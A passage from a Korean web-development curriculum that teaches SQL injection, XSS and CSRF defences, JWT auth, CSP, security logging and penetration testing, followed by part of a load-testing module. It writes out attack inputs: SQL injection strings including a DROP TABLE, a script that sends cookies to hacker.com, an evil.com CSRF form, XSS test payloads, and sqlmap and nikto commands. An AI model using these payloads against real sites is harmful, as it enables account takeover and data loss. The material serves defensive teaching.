              title: "초급: 주요 웹 보안 위협 이해하고 기본 방어하기",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "OWASP Top 10 중 핵심 공격을 이해하고, 기본적인 방어 코드를 작성할 수 있다."
                },
                {
                  heading: "1. SQL Injection (가장 위험한 공격)",
                  content: "악의적인 SQL 코드를 주입하여 데이터베이스를 조작하는 공격입니다.",
                  code: `// 취약한 코드 (절대 이렇게 하지 마세요!)
app.post('/login', (req, res) => {
  const query = \`
    SELECT * FROM users
    WHERE username = '\${req.body.username}'
    AND password = '\${req.body.password}'
  \`;

  db.query(query, (err, users) => {
    if (users.length > 0) {
      res.json({ success: true });
    }
  });
});

// 공격 시나리오:
// username: admin' --
// password: (아무거나)

// 실제 실행되는 쿼리:
// SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
// '--'는 주석이므로 비밀번호 검증이 무시됨!

// 더 위험한 공격:
// username: admin'; DROP TABLE users; --
// 실행: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
// 결과: users 테이블 삭제!`
                },
                {
                  heading: "2. SQL Injection 방어 - Prepared Statement 사용",
                  code: `// 안전한 코드 (Parameterized Query)
app.post('/login', async (req, res) => {
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';

  const [users] = await db.query(query, [
    req.body.username,
    req.body.password
  ]);

  if (users.length > 0) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: '로그인 실패' });
  }
});

// 작동 원리:
// 1. ?는 플레이스홀더
// 2. 두 번째 인자의 값이 자동으로 이스케이프됨
// 3. username에 "admin' --"를 넣어도 문자열로 처리
// 4. SELECT * FROM users WHERE username = 'admin\\' --' ... (안전!)

// ORM 사용 시 (더 안전)
const user = await User.findOne({
  where: {
    username: req.body.username,
    password: req.body.password
  }
});`
                },
                {
                  heading: "3. XSS (Cross-Site Scripting) 공격",
                  content: "악의적인 JavaScript를 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.",
                  code: `// 취약한 코드
app.get('/profile/:userId', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.userId]);

  res.send(\`
    <h1>프로필</h1>
    <p>이름: \${user.name}</p>
    <p>소개: \${user.bio}</p>
  \`);
});

// 공격 시나리오:
// 사용자가 bio에 입력:
// <script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>

// 다른 사용자가 프로필 방문 시:
// 1. 스크립트가 실행됨
// 2. 세션 쿠키가 해커 서버로 전송됨
// 3. 해커가 쿠키로 로그인 가능 (계정 탈취!)`
                },
                {
                  heading: "4. XSS 방어 - HTML 이스케이핑",
                  code: `// 안전한 코드 (HTML Escaping)
const escapeHtml = (text) => {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

app.get('/profile/:userId', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.userId]);

  res.send(\`
    <h1>프로필</h1>
    <p>이름: \${escapeHtml(user.name)}</p>
    <p>소개: \${escapeHtml(user.bio)}</p>
  \`);
});

// 결과:
// <script>alert(1)</script>
// → &lt;script&gt;alert(1)&lt;/script&gt; (화면에 그대로 표시)

// React는 자동으로 이스케이프:
function Profile({ user }) {
  return (
    <div>
      <h1>프로필</h1>
      <p>이름: {user.name}</p>
      <p>소개: {user.bio}</p>
    </div>
  );
}
// React는 {}안의 값을 자동으로 이스케이프 (안전!)`
                },
                {
                  heading: "5. HTTPS와 SSL/TLS 인증서",
                  steps: [
                    {
                      label: "인증서 만료일 확인",
                      code: `# 방법 1: OpenSSL 명령어
openssl s_client -connect yourdomain.com:443 -servername yourdomain.com 2>/dev/null | openssl x509 -noout -dates

# 출력:
# notBefore=Jan  1 00:00:00 2024 GMT
# notAfter=Apr  1 23:59:59 2024 GMT  ← 만료일!

# 방법 2: 브라우저
# 1. 사이트 접속
# 2. 주소창 자물쇠 아이콘 클릭
# 3. "인증서" 클릭
# 4. "유효 기간" 확인`
                    },
                    {
                      label: "Let's Encrypt로 무료 인증서 발급",
                      code: `# Certbot 설치 (Ubuntu)
sudo apt install certbot python3-certbot-nginx

# 인증서 발급 및 Nginx 자동 설정
sudo certbot --nginx -d yourdomain.com -d www.yourdomain.com

# 자동 갱신 설정 (90일마다 필요)
sudo certbot renew --dry-run

# Cron으로 자동화
sudo crontab -e
# 매일 새벽 3시에 갱신 체크
0 3 * * * certbot renew --quiet`
                    }
                  ]
                },
                {
                  heading: "6. 안전한 비밀번호 저장 (해싱)",
                  code: `// 절대 안 됨: 평문 저장
await db.query('INSERT INTO users (username, password) VALUES (?, ?)', [
  username,
  password // 그대로 저장 ← 위험!
]);

// 안전: bcrypt로 해싱
const bcrypt = require('bcrypt');

// 회원가입
app.post('/signup', async (req, res) => {
  const saltRounds = 10;
  const hashedPassword = await bcrypt.hash(req.body.password, saltRounds);

  await db.query('INSERT INTO users (username, password) VALUES (?, ?)', [
    req.body.username,
    hashedPassword // 해시된 값 저장
  ]);

  res.json({ success: true });
});

// 로그인
app.post('/login', async (req, res) => {
  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [
    req.body.username
  ]);

  if (users.length === 0) {
    return res.status(401).json({ error: '사용자 없음' });
  }

  const match = await bcrypt.compare(req.body.password, users[0].password);

  if (match) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: '비밀번호 틀림' });
  }
});

// DB에 저장되는 예시:
// username: admin
// password: $2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
// → 원본 비밀번호 복구 불가능!`
                },
                {
                  heading: "💡 초급 실습 과제",
                  checklist: [
                    "취약한 로그인 코드에 SQL Injection 공격 시도 후 성공 확인",
                    "Prepared Statement로 수정 후 공격 방어 확인",
                    "사용자 입력을 그대로 출력하여 XSS 공격 재현",
                    "HTML 이스케이핑 적용 후 스크립트 실행 안 되는지 확인",
                    "현재 운영 중인 사이트의 SSL 인증서 만료일 확인"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 인증/인가 시스템과 CSRF 방어",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "JWT 인증을 구현하고, CSRF와 같은 세션 관련 공격을 방어할 수 있다."
                },
                {
                  heading: "1. JWT (JSON Web Token) 인증 구현",
                  code: `const jwt = require('jsonwebtoken');
const SECRET_KEY = process.env.JWT_SECRET; // 환경변수로 관리

// 로그인 (토큰 발급)
app.post('/login', async (req, res) => {
  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [
    req.body.username
  ]);

  if (users.length === 0) {
    return res.status(401).json({ error: '인증 실패' });
  }

  const match = await bcrypt.compare(req.body.password, users[0].password);

  if (!match) {
    return res.status(401).json({ error: '인증 실패' });
  }

  // JWT 토큰 생성
  const token = jwt.sign(
    {
      userId: users[0].id,
      username: users[0].username,
      role: users[0].role
    },
    SECRET_KEY,
    { expiresIn: '1h' } // 1시간 후 만료
  );

  res.json({ token });
});

// 인증 미들웨어
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

  if (!token) {
    return res.status(401).json({ error: '토큰 없음' });
  }

  jwt.verify(token, SECRET_KEY, (err, user) => {
    if (err) {
      return res.status(403).json({ error: '유효하지 않은 토큰' });
    }

    req.user = user; // 토큰에서 추출한 정보
    next();
  });
}

// 보호된 라우트
app.get('/api/profile', authenticateToken, async (req, res) => {
  const [users] = await db.query('SELECT * FROM users WHERE id = ?', [
    req.user.userId
  ]);

  res.json(users[0]);
});

// Frontend에서 사용
fetch('/api/profile', {
  headers: {
    'Authorization': \`Bearer \${token}\`
  }
})`
                },
                {
                  heading: "2. Refresh Token으로 보안 강화",
                  code: `// Access Token (짧은 만료 시간) + Refresh Token (긴 만료 시간)
app.post('/login', async (req, res) => {
  // ... 인증 로직

  const accessToken = jwt.sign(
    { userId: user.id },
    ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' } // 15분
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' } // 7일
  );

  // Refresh Token을 DB에 저장
  await db.query('UPDATE users SET refresh_token = ? WHERE id = ?', [
    refreshToken,
    user.id
  ]);

  res.json({ accessToken, refreshToken });
});

// Access Token 갱신 엔드포인트
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    return res.status(401).json({ error: '리프레시 토큰 없음' });
  }

  // DB에 저장된 토큰과 일치하는지 확인
  const [users] = await db.query('SELECT * FROM users WHERE refresh_token = ?', [
    refreshToken
  ]);

  if (users.length === 0) {
    return res.status(403).json({ error: '유효하지 않은 토큰' });
  }

  jwt.verify(refreshToken, REFRESH_TOKEN_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: '만료된 토큰' });
    }

    const newAccessToken = jwt.sign(
      { userId: user.userId },
      ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  });
});

// 로그아웃 (토큰 무효화)
app.post('/logout', authenticateToken, async (req, res) => {
  await db.query('UPDATE users SET refresh_token = NULL WHERE id = ?', [
    req.user.userId
  ]);

  res.json({ success: true });
});`
                },
                {
                  heading: "3. CSRF (Cross-Site Request Forgery) 공격과 방어",
                  content: "사용자가 로그인한 상태에서 악의적인 요청을 자동으로 보내는 공격입니다.",
                  code: `// 공격 시나리오:
// 1. 사용자가 example.com에 로그인 (쿠키 저장됨)
// 2. 악의적인 사이트 evil.com 방문
// 3. evil.com에 숨겨진 코드:
<form action="https://example.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

// 결과:
// - 사용자 모르게 10000원이 해커에게 송금됨
// - 브라우저가 자동으로 쿠키를 포함하여 요청을 보냄

// 방어 1: CSRF 토큰 사용
const csurf = require('csurf');
const csrfProtection = csurf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // CSRF 토큰이 유효하지 않으면 자동으로 403 에러
  // 유효한 경우에만 여기 도달
  res.json({ success: true });
});

// HTML:
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input name="to">
  <input name="amount">
  <button type="submit">송금</button>
</form>

// 방어 2: SameSite 쿠키 속성
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // 다른 사이트에서의 요청에는 쿠키 안 보냄
});`
                },
                {
                  heading: "4. 권한 관리 (Authorization)",
                  code: `// Role-Based Access Control (RBAC)
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read']
};

function authorize(requiredPermission) {
  return (req, res, next) => {
    const userRole = req.user.role; // JWT에서 추출
    const permissions = roles[userRole];

    if (!permissions || !permissions.includes(requiredPermission)) {
      return res.status(403).json({
        error: '권한이 없습니다.'
      });
    }

    next();
  };
}

// 사용
app.delete('/api/posts/:id',
  authenticateToken,
  authorize('delete'), // delete 권한 필요
  async (req, res) => {
    await db.query('DELETE FROM posts WHERE id = ?', [req.params.id]);
    res.json({ success: true });
  }
);

// 더 세밀한 제어: 본인 것만 수정 가능
app.put('/api/posts/:id',
  authenticateToken,
  async (req, res) => {
    const [posts] = await db.query('SELECT * FROM posts WHERE id = ?', [
      req.params.id
    ]);

    if (posts.length === 0) {
      return res.status(404).json({ error: '게시글 없음' });
    }

    // 본인 글이거나 관리자인 경우에만 허용
    if (posts[0].author_id !== req.user.userId && req.user.role !== 'admin') {
      return res.status(403).json({ error: '권한 없음' });
    }

    await db.query('UPDATE posts SET content = ? WHERE id = ?', [
      req.body.content,
      req.params.id
    ]);

    res.json({ success: true });
  }
);`
                },
                {
                  heading: "5. Rate Limiting으로 브루트포스 방어",
                  code: `const rateLimit = require('express-rate-limit');

// 로그인 시도 제한
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15분
  max: 5, // 5번 시도
  message: '너무 많은 로그인 시도. 15분 후 다시 시도하세요.',
  skipSuccessfulRequests: true // 성공하면 카운트 안 함
});

app.post('/login', loginLimiter, async (req, res) => {
  // 로그인 로직
});

// IP별 제한 + 사용자별 제한
const RedisStore = require('rate-limit-redis');

const apiLimiter = rateLimit({
  store: new RedisStore({ client: redis }),
  windowMs: 60 * 1000,
  max: async (req) => {
    if (req.user && req.user.role === 'admin') {
      return 1000; // 관리자는 1000회
    }
    return 100; // 일반 사용자는 100회
  },
  keyGenerator: (req) => {
    // 로그인 사용자는 userId, 비로그인은 IP
    return req.user ? \`user:\${req.user.userId}\` : \`ip:\${req.ip}\`;
  }
});

app.use('/api/', apiLimiter);`
                },
                {
                  heading: "⚡ 중급 실습 과제",
                  checklist: [
                    "JWT 인증 시스템 구현 후 Postman으로 토큰 확인",
                    "만료된 토큰으로 요청 시 403 에러 발생하는지 테스트",
                    "CSRF 토큰 없이 요청 시 차단되는지 확인",
                    "일반 사용자로 관리자 전용 API 호출 시 403 확인",
                    "로그인 5번 실패 후 15분 제한되는지 확인"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 보안 모니터링과 침투 테스트",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "보안 취약점을 자동으로 탐지하고, 침투 테스트로 시스템을 강화할 수 있다."
                },
                {
                  heading: "1. OWASP ZAP로 자동 취약점 스캔",
                  steps: [
                    {
                      label: "설치 및 기본 스캔",
                      code: `# Docker로 OWASP ZAP 실행
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://your-app.com

# 결과:
# WARN-NEW: SQL Injection (GET parameter 'id')
# WARN-NEW: Cross Site Scripting (Reflected) (POST parameter 'comment')
# WARN-NEW: Missing Anti-CSRF Tokens (POST /api/transfer)

# HTML 리포트 생성
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable \\
  zap-full-scan.py -t https://your-app.com -r report.html`
                    },
                    {
                      label: "CI/CD 파이프라인 통합",
                      code: `# .github/workflows/security-scan.yml
name: Security Scan
on:
  pull_request:
    branches: [main]

jobs:
  zap_scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run ZAP Scan
        run: |
          docker run -v \${GITHUB_WORKSPACE}:/zap/wrk/:rw \\
            -t owasp/zap2docker-stable \\
            zap-baseline.py -t \${{ secrets.STAGING_URL }} \\
            -r zap-report.html

      - name: Upload Report
        uses: actions/upload-artifact@v3
        with:
          name: zap-report
          path: zap-report.html

      # 심각한 취약점 발견 시 PR 차단
      - name: Check Vulnerabilities
        run: |
          if grep -q "FAIL-NEW" zap-report.html; then
            echo "Critical vulnerabilities found!"
            exit 1
          fi`
                    }
                  ]
                },
                {
                  heading: "2. Content Security Policy (CSP) 설정",
                  code: `// XSS 공격을 원천 차단하는 HTTP 헤더
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      "'unsafe-inline'", // React의 인라인 스크립트 허용 (최소화 권장)
      "https://cdn.jsdelivr.net"
    ],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));

// 응답 헤더:
// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; ...

// 효과:
// 1. 허용되지 않은 도메인의 스크립트 실행 차단
// 2. 인라인 스크립트 차단 (XSS 방어)
// 3. eval() 같은 위험한 함수 차단

// 위반 리포트 수집
app.use(helmet.contentSecurityPolicy({
  directives: {
    // ... 위와 동일
    reportUri: '/api/csp-report'
  }
}));

app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', req.body);
  // Sentry 등으로 전송
  res.status(204).end();
});`
                },
                {
                  heading: "3. 보안 로그 수집 및 분석",
                  code: `// Winston으로 보안 이벤트 로깅
const winston = require('winston');

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
    new winston.transports.Console()
  ]
});

// 의심스러운 활동 로깅
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [username]);

  if (users.length === 0) {
    securityLogger.warn('Login attempt with non-existent user', {
      username,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date()
    });
    return res.status(401).json({ error: '인증 실패' });
  }

  const match = await bcrypt.compare(password, users[0].password);

  if (!match) {
    securityLogger.warn('Failed login attempt', {
      userId: users[0].id,
      username,
      ip: req.ip,
      timestamp: new Date()
    });

    // 5번 실패 시 계정 잠금
    await db.query(
      'UPDATE users SET failed_attempts = failed_attempts + 1 WHERE id = ?',
      [users[0].id]
    );

    const updatedUser = await db.query('SELECT * FROM users WHERE id = ?', [users[0].id]);
    if (updatedUser[0].failed_attempts >= 5) {
      securityLogger.error('Account locked due to multiple failed attempts', {
        userId: users[0].id,
        ip: req.ip
      });
      await db.query('UPDATE users SET locked_until = ? WHERE id = ?', [
        new Date(Date.now() + 30 * 60 * 1000), // 30분 잠금
        users[0].id
      ]);
    }

    return res.status(401).json({ error: '인증 실패' });
  }

  // 성공 시 실패 카운터 리셋
  await db.query('UPDATE users SET failed_attempts = 0 WHERE id = ?', [users[0].id]);

  securityLogger.info('Successful login', {
    userId: users[0].id,
    ip: req.ip
  });

  // JWT 발급...
});

// 권한 없는 접근 시도
app.use((err, req, res, next) => {
  if (err.status === 403) {
    securityLogger.warn('Unauthorized access attempt', {
      userId: req.user?.userId,
      path: req.path,
      method: req.method,
      ip: req.ip
    });
  }
  next(err);
});`
                },
                {
                  heading: "4. 침투 테스트 (Penetration Testing)",
                  code: `# sqlmap으로 SQL Injection 테스트
sqlmap -u "https://your-app.com/api/users?id=1" --batch --risk=3 --level=5

# 결과:
# [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
# [INFO] GET parameter 'id' is vulnerable. Do you want to keep testing? [y/N] y
# sqlmap identified the following injection point(s):
# Parameter: id (GET)
#   Type: boolean-based blind
#   Payload: id=1 AND 1=1

# Burp Suite로 XSS 테스트
# 1. Burp Suite 실행
# 2. 브라우저 프록시 설정
# 3. Intruder 탭에서 페이로드 설정:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(String.fromCharCode(88,83,83))</script>

# 4. Attack 실행 후 응답 확인

# Nikto 웹 서버 스캔
nikto -h https://your-app.com

# 결과:
# + Server: nginx/1.18.0
# + The anti-clickjacking X-Frame-Options header is not present.
# + The X-Content-Type-Options header is not set.
# + No CGI Directories found
# + OSVDB-3268: /backup/: Directory indexing found.

# 보안 헤더 추가
app.use(helmet({
  frameguard: { action: 'deny' }, // Clickjacking 방지
  contentTypeOptions: true, // MIME 타입 스니핑 방지
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));`
                },
                {
                  heading: "5. Secrets 관리 및 환경변수 보안",
                  code: `// .env 파일 사용 (절대 Git에 커밋하지 마세요!)
// .env
DATABASE_PASSWORD=super_secret_password
JWT_SECRET=very_long_random_string_here
API_KEY=sk-1234567890abcdef

// .gitignore에 추가
echo ".env" >> .gitignore

// 코드에서 사용
require('dotenv').config();

const dbPassword = process.env.DATABASE_PASSWORD;
const jwtSecret = process.env.JWT_SECRET;

// Docker Secrets 사용 (프로덕션)
# docker-compose.yml
version: '3.8'
services:
  app:
    image: myapp
    secrets:
      - db_password
      - jwt_secret

secrets:
  db_password:
    file: ./secrets/db_password.txt
  jwt_secret:
    file: ./secrets/jwt_secret.txt

// 코드에서 읽기
const fs = require('fs');

const dbPassword = fs.readFileSync('/run/secrets/db_password', 'utf8').trim();
const jwtSecret = fs.readFileSync('/run/secrets/jwt_secret', 'utf8').trim();

// AWS Secrets Manager 사용 (클라우드)
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager({ region: 'us-east-1' });

async function getSecret(secretName) {
  const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();
  return JSON.parse(data.SecretString);
}

const secrets = await getSecret('prod/myapp/credentials');
const dbPassword = secrets.DATABASE_PASSWORD;`
                },
                {
                  heading: "6. 보안 체크리스트 자동화",
                  code: `# npm audit로 의존성 취약점 점검
npm audit

# 결과:
# found 3 vulnerabilities (1 moderate, 2 high) in 1200 scanned packages
#   run \`npm audit fix\` to fix them, or \`npm audit\` for details

# 자동 수정
npm audit fix

# 강제 수정 (breaking changes 포함)
npm audit fix --force

# GitHub Dependabot 활성화
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

# Snyk로 실시간 모니터링
snyk monitor
# https://app.snyk.io 에서 대시보드 확인

# Pre-commit hook으로 보안 검사
# .husky/pre-commit
#!/bin/sh
npm audit --audit-level=high
if [ $? -ne 0 ]; then
  echo "Security vulnerabilities found! Commit aborted."
  exit 1
fi`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "OWASP ZAP으로 전체 앱 스캔 후 발견된 취약점 수정",
                    "CSP 헤더 설정 후 외부 스크립트 차단되는지 확인",
                    "sqlmap으로 SQL Injection 테스트 후 모든 파라미터 방어 확인",
                    "실패한 로그인 시도 5번 후 계정 30분 잠금 구현",
                    "GitHub Actions에 보안 스캔 추가하여 취약점 발견 시 PR 차단"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '3-4',
          name: '부하 테스트와 스케일링',
          goal: '시스템의 한계를 파악하고 확장 계획을 세울 수 있다',
          hours: 10,
          keywords: ['load testing', 'scalability', 'performance benchmarking'],
          tasks: [
            '간단한 부하 테스트 (JMeter 또는 Artillery)',
            '현재 시스템의 동시 접속 한계 측정',
            '서버 증설 계획 작성'
          ],
          content: {
            beginner: {
              title: "초급: 부하 테스트 도구로 시스템 한계 측정하기",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "부하 테스트의 개념을 이해하고, 간단한 도구로 현재 시스템의 처리 능력을 측정할 수 있다."
                },
                {
                  heading: "1. 부하 테스트가 필요한 이유",
                  content: "실제 운영 환경에서 장애가 발생하기 전에 시스템의 한계를 파악해야 합니다.",
                  list: [
                    "실제 상황: 평소 100명 → 이벤트 때 1만명 → 서버 다운",
                    "테스트로 미리 발견: 500명에서 응답 시간 5초 증가 → 대비 가능",
                    "용량 계획 수립: 몇 명까지 감당 가능한지 정확히 알 수 있음",
                    "병목 지점 파악: DB? 서버? 네트워크?"
                  ]
                },
                {
                  heading: "2. Apache Bench로 첫 부하 테스트",
                  steps: [
                    {
                      label: "설치 (대부분 OS에 기본 설치됨)",
                      code: `# macOS/Linux 확인
which ab

# Ubuntu 설치
sudo apt install apache2-utils

# Windows
# https://www.apachelounge.com/download/ 에서 다운로드`
                    },
                    {
                      label: "기본 사용법",
                      code: `# 100개 요청, 동시 10개
ab -n 100 -c 10 https://your-app.com/

# 결과:
Concurrency Level:      10
Time taken for tests:   2.345 seconds
Complete requests:      100
Failed requests:        0
Total transferred:      45600 bytes
Requests per second:    42.64 [#/sec] ← 초당 처리량
Time per request:       234.5 [ms] ← 평균 응답 시간
Time per request:       23.5 [ms] (mean, across all concurrent requests)

# 해석:
- 초당 42개 요청 처리 가능
- 평균 응답 시간 234ms
- 실패 0개 → 안정적`
                    },
                    {
                      label: "부하 증가시키기",
                      code: `# 1000개 요청, 동시 100개
ab -n 1000 -c 100 https://your-app.com/api/products

# 결과:
Requests per second:    25.32 [#/sec] ← 감소!
Time per request:       3950.5 [ms] ← 증가!
Failed requests:        15 ← 실패 발생!

# 문제 발견:
- 동시 접속 100명에서 성능 저하
- 일부 요청 실패 (타임아웃)
- 처리량 42 → 25로 감소 (40% 하락)`
                    }
                  ]
                },
                {
                  heading: "3. k6로 시나리오 기반 테스트",
                  code: `// k6 설치
// https://k6.io/docs/getting-started/installation/

// test.js
import http from 'k6/http';
import { sleep, check } from 'k6';

export const options = {
  stages: [
    { duration: '30s', target: 20 },  // 30초 동안 20명까지 증가
    { duration: '1m', target: 50 },   // 1분 동안 50명 유지
    { duration: '30s', target: 0 },   // 30초 동안 0명으로 감소
  ],
  thresholds: {
    http_req_duration: ['p(95)<500'], // 95%가 500ms 이내
    http_req_failed: ['rate<0.01'],   // 실패율 1% 이하
  },
};

export default function () {
  const res = http.get('https://your-app.com/api/products');

  check(res, {
    '상태 코드 200': (r) => r.status === 200,
    '응답 시간 < 500ms': (r) => r.timings.duration < 500,
  });

  sleep(1);
}

// 실행
k6 run test.js

// 결과:
     ✓ 상태 코드 200
     ✗ 응답 시간 < 500ms
       ↳  85% — ✓ 4250 / ✗ 750

     http_req_duration..........: avg=450ms min=120ms med=420ms max=2.1s p(95)=680ms ← 임계값 초과!
     http_req_failed............: 0.80% ✓ 40 ✗ 4960 ← 통과
     iterations.................: 5000`
                },
                {
                  heading: "4. 동시 접속자 한계 찾기",
                  code: `# 단계별로 부하 증가
# Step 1: 동시 10명
ab -n 100 -c 10 https://your-app.com/
# 결과: 평균 200ms, 실패 0

# Step 2: 동시 50명
ab -n 500 -c 50 https://your-app.com/
# 결과: 평균 400ms, 실패 0

# Step 3: 동시 100명
ab -n 1000 -c 100 https://your-app.com/
# 결과: 평균 1200ms, 실패 5 ← 한계 근접

# Step 4: 동시 200명
ab -n 2000 -c 200 https://your-app.com/
# 결과: 평균 5000ms, 실패 150 ← 한계 초과!

# 결론: 동시 100~150명이 한계`
                },
                {
                  heading: "5. 서버 리소스 모니터링",
                  code: `# 테스트 중 서버 리소스 확인
# SSH로 서버 접속 후

# CPU, 메모리 실시간 확인
htop

# 또는
top

# 결과 분석:
CPU:  85% ← 높음
Mem:  3.2G/4G (80%) ← 높음
Load: 4.5, 3.8, 2.1 ← CPU 코어 수보다 높음 (위험)

# Docker 컨테이너별 리소스
docker stats

# 결과:
CONTAINER       CPU %    MEM USAGE
backend         65%      1.8GB ← 가장 높음 (병목!)
mysql           25%      800MB
redis           5%       100MB`
                },
                {
                  heading: "6. 간단한 증설 계획",
                  code: `# 현재 상황 분석
- 동시 접속 한계: 100~150명
- 병목: Backend 서버 (CPU 65%, 메모리 1.8GB)
- 목표: 500명 동시 접속

# 해결 방안
1. 수직 확장 (Scale Up)
   - 서버 스펙 업그레이드: 2코어 4GB → 4코어 8GB
   - 예상 효과: 300명까지 가능
   - 비용: 월 $40 → $80

2. 수평 확장 (Scale Out)
   - Backend 서버 2대로 증설 + Load Balancer
   - 예상 효과: 300~600명까지 가능
   - 비용: 월 $40 → $100 (서버 2대 + LB)

3. 최적화 (먼저 시도)
   - 느린 쿼리 개선 (인덱스 추가)
   - Redis 캐싱 도입
   - 예상 효과: 200~250명까지 개선
   - 비용: $0 (기존 인프라)`
                },
                {
                  heading: "💡 초급 실습 과제",
                  checklist: [
                    "Apache Bench로 메인 페이지 부하 테스트 (100명 동시 접속)",
                    "k6로 3단계 부하 테스트 (20→50→100명) 스크립트 작성 및 실행",
                    "동시 접속자를 단계별로 증가시켜 한계점 찾기",
                    "htop으로 테스트 중 CPU/메모리 사용률 확인",
                    "현재 시스템의 한계와 개선 방안 문서 작성 (1페이지)"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 실전 부하 테스트와 CapRover 스케일링",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "실제 사용자 패턴을 시뮬레이션하고, CapRover에서 앱을 스케일링할 수 있다."
                },
                {
                  heading: "1. 실전 시나리오 부하 테스트",
                  code: `// k6로 복잡한 사용자 시나리오 작성
import http from 'k6/http';
import { check, group, sleep } from 'k6';

export const options = {
  stages: [
    { duration: '2m', target: 100 },  // 2분간 100명까지 증가
    { duration: '5m', target: 100 },  // 5분간 100명 유지 (피크 타임)
    { duration: '2m', target: 200 },  // 2분간 200명까지 증가 (이벤트)
    { duration: '3m', target: 200 },  // 3분간 200명 유지
    { duration: '2m', target: 0 },    // 2분간 0명으로 감소
  ],
  thresholds: {
    http_req_duration: ['p(95)<1000', 'p(99)<2000'],
    http_req_failed: ['rate<0.05'],
    checks: ['rate>0.95'], // 95% 이상 성공
  },
};

export default function () {
  group('사용자 여정', function () {
    // 1. 홈 페이지 방문
    let res = http.get('https://your-app.com/');
    check(res, { '홈 로딩 성공': (r) => r.status === 200 });
    sleep(2);

    // 2. 상품 목록 조회
    res = http.get('https://your-app.com/api/products');
    check(res, {
      '상품 목록 성공': (r) => r.status === 200,
      '상품 10개 이상': (r) => JSON.parse(r.body).length >= 10,
    });
    sleep(3);

    // 3. 상품 상세 조회 (무작위)
    const productId = Math.floor(Math.random() * 100) + 1;
    res = http.get(\`https://your-app.com/api/products/\${productId}\`);
    check(res, { '상세 조회 성공': (r) => r.status === 200 });
    sleep(5);

    // 4. 장바구니 추가 (10%만 실행)
    if (Math.random() < 0.1) {
      res = http.post('https://your-app.com/api/cart', JSON.stringify({
        productId: productId,
        quantity: 1
      }), {
        headers: { 'Content-Type': 'application/json' }
      });
      check(res, { '장바구니 추가 성공': (r) => r.status === 201 });
    }

    sleep(1);
  });
}

// 실행 및 결과 분석
k6 run --out json=results.json load-test.js

// 결과:
     ✓ 홈 로딩 성공.............: 99.8%
     ✓ 상품 목록 성공...........: 98.5%
     ✓ 상품 10개 이상...........: 98.5%
     ✓ 상세 조회 성공...........: 95.2% ← 피크 때 실패율 증가
     ✓ 장바구니 추가 성공.......: 92.1% ← 가장 낮음

